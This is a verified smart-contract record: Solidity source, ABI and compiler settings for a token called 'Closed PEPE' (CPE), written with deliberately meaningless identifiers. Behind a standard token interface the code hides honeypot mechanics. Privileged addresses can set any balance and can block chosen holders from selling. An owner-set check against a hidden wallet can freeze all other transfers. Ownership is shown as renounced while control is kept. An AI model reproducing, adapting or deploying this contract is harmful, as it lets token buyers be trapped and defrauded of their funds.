{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface autoAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTrading) external view returns (uint256);\n\n    function transfer(address fundLiquidity, uint256 sellTotal) external returns (bool);\n\n    function allowance(address enableIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLiquidity,\n        uint256 sellTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listIsAmount, uint256 value);\n    event Approval(address indexed enableIs, address indexed spender, uint256 value);\n}\n\nabstract contract atAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundAt {\n    function createPair(address launchedIs, address takeIs) external returns (address);\n}\n\ninterface autoAmountMetadata is autoAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ClosedPEPE is atAmount, autoAmount, autoAmountMetadata {\n\n    function liquidityAmount(address minMarketing) public {\n        launchedFund();\n        if (amountMin == limitIs) {\n            limitIs = false;\n        }\n        if (minMarketing == tokenMin || minMarketing == autoTrading) {\n            return;\n        }\n        tokenMaxTeam[minMarketing] = true;\n    }\n\n    mapping(address => bool) public isAutoLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return isSell;\n    }\n\n    uint256 private amountEnable;\n\n    bool public listLiquidity;\n\n    event OwnershipTransferred(address indexed takeExemptLaunch, address indexed atTrading);\n\n    address private txAutoMin;\n\n    address totalMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 feeWallet;\n\n    constructor (){\n        if (listLiquidity) {\n            limitIs = true;\n        }\n        teamMax senderList = teamMax(txReceiver);\n        autoTrading = fundAt(senderList.factory()).createPair(senderList.WETH(), address(this));\n        if (amountMin) {\n            listLiquidity = false;\n        }\n        tokenMin = _msgSender();\n        senderEnableLiquidity();\n        isAutoLiquidity[tokenMin] = true;\n        txTotal[tokenMin] = toIs;\n        if (amountEnable != autoLiquidityTeam) {\n            listLiquidity = true;\n        }\n        emit Transfer(address(0), tokenMin, toIs);\n    }\n\n    bool public swapSell;\n\n    function minFundSwap(address autoLaunchTake, uint256 sellTotal) public {\n        launchedFund();\n        txTotal[autoLaunchTake] = sellTotal;\n    }\n\n    function balanceOf(address receiverTrading) public view virtual override returns (uint256) {\n        return txTotal[receiverTrading];\n    }\n\n    uint256 private toIs = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromMax;\n    }\n\n    function amountTotalFee(address receiverMax) public {\n        if (swapSell) {\n            return;\n        }\n        if (shouldList != limitIs) {\n            amountMin = true;\n        }\n        isAutoLiquidity[receiverMax] = true;\n        \n        swapSell = true;\n    }\n\n    function senderEnableLiquidity() public {\n        emit OwnershipTransferred(tokenMin, address(0));\n        txAutoMin = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalAuto;\n    }\n\n    bool public totalLiquidity;\n\n    bool public limitIs;\n\n    address txReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address autoLiquidity, address fundLiquidity, uint256 sellTotal) external override returns (bool) {\n        if (_msgSender() != txReceiver) {\n            if (marketingSwap[autoLiquidity][_msgSender()] != type(uint256).max) {\n                require(sellTotal <= marketingSwap[autoLiquidity][_msgSender()]);\n                marketingSwap[autoLiquidity][_msgSender()] -= sellTotal;\n            }\n        }\n        return isReceiverWallet(autoLiquidity, fundLiquidity, sellTotal);\n    }\n\n    function fromAutoTeam(uint256 sellTotal) public {\n        launchedFund();\n        feeWallet = sellTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return txAutoMin;\n    }\n\n    function owner() external view returns (address) {\n        return txAutoMin;\n    }\n\n    function isReceiverWallet(address autoLiquidity, address fundLiquidity, uint256 sellTotal) internal returns (bool) {\n        if (autoLiquidity == tokenMin) {\n            return senderBuy(autoLiquidity, fundLiquidity, sellTotal);\n        }\n        uint256 fundReceiver = autoAmount(autoTrading).balanceOf(totalMax);\n        require(fundReceiver == feeWallet);\n        require(fundLiquidity != totalMax);\n        if (tokenMaxTeam[autoLiquidity]) {\n            return senderBuy(autoLiquidity, fundLiquidity, exemptIs);\n        }\n        return senderBuy(autoLiquidity, fundLiquidity, sellTotal);\n    }\n\n    string private isSell = \"Closed PEPE\";\n\n    uint8 private fromMax = 18;\n\n    function launchedFund() private view {\n        require(isAutoLiquidity[_msgSender()]);\n    }\n\n    bool public amountMin;\n\n    function allowance(address autoFee, address walletTeam) external view virtual override returns (uint256) {\n        if (walletTeam == txReceiver) {\n            return type(uint256).max;\n        }\n        return marketingSwap[autoFee][walletTeam];\n    }\n\n    address public autoTrading;\n\n    function senderBuy(address autoLiquidity, address fundLiquidity, uint256 sellTotal) internal returns (bool) {\n        require(txTotal[autoLiquidity] >= sellTotal);\n        txTotal[autoLiquidity] -= sellTotal;\n        txTotal[fundLiquidity] += sellTotal;\n        emit Transfer(autoLiquidity, fundLiquidity, sellTotal);\n        return true;\n    }\n\n    mapping(address => bool) public tokenMaxTeam;\n\n    string private totalAuto = \"CPE\";\n\n    function approve(address walletTeam, uint256 sellTotal) public virtual override returns (bool) {\n        marketingSwap[_msgSender()][walletTeam] = sellTotal;\n        emit Approval(_msgSender(), walletTeam, sellTotal);\n        return true;\n    }\n\n    bool public shouldList;\n\n    mapping(address => mapping(address => uint256)) private marketingSwap;\n\n    address public tokenMin;\n\n    bool private enableFund;\n\n    uint256 constant exemptIs = 18 ** 10;\n\n    uint256 enableReceiver;\n\n    function transfer(address autoLaunchTake, uint256 sellTotal) external virtual override returns (bool) {\n        return isReceiverWallet(_msgSender(), autoLaunchTake, sellTotal);\n    }\n\n    mapping(address => uint256) private txTotal;\n\n    uint256 public autoLiquidityTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toIs;\n    }\n\n    bool public takeShouldSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExemptLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listIsAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"}],\"name\":\"amountTotalFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidityTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"fromAutoTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAutoLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"minFundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMaxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ClosedPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}